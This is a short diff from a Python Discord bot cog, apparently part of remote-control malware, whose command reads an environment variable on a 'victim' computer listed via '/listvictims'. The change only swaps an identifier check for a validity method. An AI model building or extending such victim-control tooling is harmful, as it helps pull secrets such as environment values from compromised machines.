@@ -18,7 +18,7 @@ class GetEnvironment(commands.Cog):
         victim: Identifier of the affected computer (found via /listvictims).
         environment: The variable of which the value is wanted
         """
-        if str(victim) == str(self.bot.identifier):
+        if self.valid(victim):
             try: 
                 value = os.getenv(environment)
             except: 
